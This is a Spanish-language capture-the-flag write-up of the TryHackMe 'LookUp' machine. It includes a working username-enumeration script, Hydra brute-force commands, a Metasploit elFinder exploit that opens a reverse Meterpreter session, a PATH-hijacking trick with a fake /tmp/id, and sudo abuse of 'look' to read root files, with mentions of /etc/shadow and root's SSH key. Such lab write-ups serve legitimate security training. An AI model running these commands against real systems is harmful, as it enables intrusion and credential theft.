# THM-LookUp-Writeup-ES-
Writeup completo de la máquina LookUp (TryHackMe). Pentesting de principio a fin: Explotación de elFinder (RCE), Enumeración de usuarios con Python, PATH Hijacking y Privilege Escalation mediante Sudoers.



NMAP
```bash                                                    
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 43:67:86:1a:b8:37:45:85:9e:65:f1:d4:0f:c8:91:23 (RSA)
|   256 31:f0:28:e5:3f:6c:d7:c6:a8:3f:fc:83:b0:19:0c:c0 (ECDSA)
|_  256 66:59:d3:cb:1b:a8:37:a4:2c:48:5b:c0:eb:2e:28:3e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
​
WHATWEB
```bash
http://lookup.thm [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[xxxxxxx], PasswordField[password], Title[Login Page
```
​
PANEL LOGIN
<br>



<br>
<img width="1057" height="425" alt="LOGIN" src="https://github.com/user-attachments/assets/db55b2e0-4d9f-4c51-8eb5-b8136d60795d" />
<br>

       
<br>
Dentro del panel de login nos damos cuenta que el usuario admin es un usuario valido asique después de rebuscar muchísimo porque gobuster nos da falsos positivos con un script de python hacemos fuerza bruta utilizando nombres de usuarios normales
sudo nano user_discovery.py



```python​
 import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
username_file = "/usr/share/wordlists/SecLists/Usernames/Names/names.txt"  # Replace with your wordlist path

# Fixed password for testing
password = "password"

# Custom headers (optional)
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safar>
}

# Function to send POST requests and process responses
def check_username(username):
    # Prepare the POST data
    data = {
        "username": username,
        "password": password
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data, headers=headers)

        # Check the response content
        if "Wrong password" in response.text:
            print(f"Username found: {username}")
        elif "wrong username" in response.text:
            pass  # Silent continuation for wrong usernames
        else:
            print(f"[?] Unexpected response for username: {username}")
    except requests.RequestException as e:
        print(f"[!] Request failed for username {username}: {e}")

# Main function
if __name__ == "__main__":
    try:
        # Open the username file and read each line
        with open(username_file, "r") as file:
            for line in file:
                username = line.strip()
                if not username:
                    continue  # Skip empty lines

                check_username(username)
    except FileNotFoundError:
        print(f"[!] Wordlist file '{username_file}' not found!")
    except requests.RequestException as e:
        print(f"[!] An HTTP request error occurred: {e}")
```
​


¿Por qué usamos Python en lugar de Hydra?

Enumeración vs. Fuerza Bruta: 
Hydra está diseñado para probar "Usuario + Contraseña" hasta entrar. Este script está diseñado para interrogar a la página. Queremos saber si un usuario existe basándonos en la respuesta del servidor (Enumeración).

Lógica Condicional:
El servidor de la máquina Lookup da mensajes diferentes ("Contraseña mal" vs "Usuario mal"). Hydra a veces se confunde con estos cambios sutiles. En Python, tú escribes: "Si el texto dice exactamente X, haz Y".

Flexibilidad: 
Si la página tiene una protección que bloquea tras 5 intentos, en Python puedes programar un "descanso" de 10 segundos fácilmente. En Hydra es más complejo.
<br>






<br>
<img width="478" height="106" alt="JOSE" src="https://github.com/user-attachments/assets/7fa4cf70-f7e6-4601-87b5-c7566c0653af" />

<br>








<br>
Ahora que ya tenemos un ususario real podemos tirar de fuerza bruta con hydra

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:wrong" -V
```
<br>








<br>
<img width="1490" height="605" alt="ELFINDER" src="https://github.com/user-attachments/assets/cd8f2709-cfa5-46d5-a7f9-13937f3e98a1" />
<br>









<br>
Encontramos un nuevo subodominio file.lookup.thm asique lo metemos en el /etc/hosts y una vez estamos dentro rebuscando vemos la version de elFinder
<br>
```bash
searchsploit elFinder 2.1.47
```
<br>







<br>​
<img width="927" height="162" alt="SEARCHSPLOIUT" src="https://github.com/user-attachments/assets/285ab53d-dfca-4634-aaee-504d08c4a4a7" />









<br>

Vamos a intentar un exploit de Metasploit
```bash
 use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
 set RHOSTS xxxxxxxx
 set VHOST files.lookup.thm
 set TARGETURI /elFinder/
 set LHOST xxxxxxx
 run
```
​








<br>
<img width="730" height="133" alt="METERPRETER" src="https://github.com/user-attachments/assets/845cd994-1749-4a86-936a-2c7171656494" />
<br>









<br>
Dentro del meterpreter vemos que somos ww-data asique vamos a ver que usuarios hay

```bash
cd /home
ls
```
<br>






<br>
<br>
<img width="629" height="181" alt="MET - USERS" src="https://github.com/user-attachments/assets/0043eb04-457b-4652-a3f9-09b219e7c025" />
<br>​
<br>








<br>
Una vez en esta seccion podemos coger la flag.txt del user think.

Una vez tenemos la flag empezamos con la tecnica del PATH Hijacking

<br>
Que es el PATH Hijacking?
<br>
El PATH Hijacking es una técnica de escalada de privilegios que ocurre cuando un programa con permisos elevados (como uno con el bit SUID o ejecutable vía sudo) intenta llamar a otro comando del sistema sin especificar su ruta absoluta.
<br>








<br>
<br>
<img width="848" height="116" alt="PWM" src="https://github.com/user-attachments/assets/d59e7030-6cb7-494c-9056-6cfaeabda077" />
<br>
<br>








<br>
<br>
Esta imagen explica el fallo de diseño del programa:
El error: El binario pwm (u otros programas) necesita ejecutar comandos del sistema como id o ls para funcionar.
La vulnerabilidad: Si el programador escribe simplemente id en lugar de la ruta completa (como /usr/bin/id), el sistema operativo buscará ese comando en las carpetas que aparecen en la variable $PATH, en orden de izquierda a derecha.
La explotación: Si logramos poner una carpeta bajo nuestro control (como /tmp) al principio del $PATH, el programa ejecutará nuestro archivo malicioso llamado id pensando que es el legítimo.
<br>








<br>
<br>
<img width="844" height="339" alt="PATH 1" src="https://github.com/user-attachments/assets/3ae65f56-170b-49e6-b33b-a1a1bb13ae91" />
<br>
<br>











<br>
<br>
Esta imagen es la más importante porque muestra la manipulación técnica:

<br>

Creación del script falso:
```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think)..."' >> /tmp/id
```
​

Aquí estás creando un archivo en /tmp llamado id. Su única función es mentir: cuando alguien lo ejecute, responderá diciendo que el usuario es think.
Permisos:

```bash
chmod +x /tmp/id
```
​

Le das permiso al sistema para "ejecutar" esa mentira.
Secuestro del PATH:
echo $PATH
​
 muestra: /tmp:/usr/local/sbin:...
 
Fíjate que /tmp está al principio. Esto es vital. Ahora, cualquier comando que escribas, el sistema lo buscará primero en /tmp.

El resultado final:

```/usr/sbin/pwm.```​

Este binario me ha dado unas posibles contraseñas asique me las guardo en un archivo y las intento para fuerza bruta con hydra

```bash
hydra -l think -P /home/an4nsi/Plataformas/TryHackMe/Maquinas/LookUp/pass.txt  ssh://10.80.186.166
```
​

Entro en SSH con este user

```bash
ssh think@10.xxx.xxx.xxx
```
​
Entro cona la password joxxxxxxx

Escalada de Privilegios

Una vez tengo la flag de user.txt dentro del user think intento escalada de privilegios con sudo
```bash
sudo -l
```
​
Me pide contraseña para think asique pongo la de antes: josxxxxxxxxx

Vemos que podemos abusar de este binario asique entramos en GTFObins y nos da la clave
<br>

<img width="859" height="200" alt="gtfobins" src="https://github.com/user-attachments/assets/8511f109-2f6c-4440-a32d-15631375a0eb" />
<br>

Ahora solo tenemos que adaptarlo a lo que queremos nosotros

```bash
sudo /usr/bin/look '' /root/root.txt
```
​
El privilegio: ¿Qué dice el archivo sudoers?
Cuando ejecutamos sudo -l, la máquina nos respondió:
```(ALL) /usr/bin/look```

​
Esto significa que el administrador del sistema le dio permiso al usuario think para ejecutar el programa /usr/bin/look con los poderes del superusuario (root). En el momento en que pones sudo delante de look, el sistema operativo deja de verte como "think" y le otorga al proceso todos los permisos de root.

El comando look fue diseñado originalmente para buscar palabras en un diccionario o líneas en un archivo que empiecen por una cadena específica. Su sintaxis normal es:
```look <cadena_a_buscar> <archivo>```

Por ejemplo, si buscas "hola" en un texto, solo te enseñará las líneas que empiecen por "hola".
En este caso solo tenemos que adaptar ese abuso del binario a nuestro gusto
```sudo /usr/bin/look '' /root/root.txt```
​
Aqui le estamos diciendo a la máquina: "Como root, busca en el archivo de la flag todas las líneas que empiecen por 'nada' y muéstramelas". Como resultado, el programa te vuelca el contenido completo del archivo en la pantalla.

Al poder leer cualquier archivo como root, podríamos haber leído también:
```/etc/shadow```: Para ver los hashes de las contraseñas de todos los usuarios y crackearlos.
```/root/.ssh/id_rsa:``` Para robar la llave privada de root y entrar por SSH directamente siempre que quieras.

Ya seriamos ROOT!

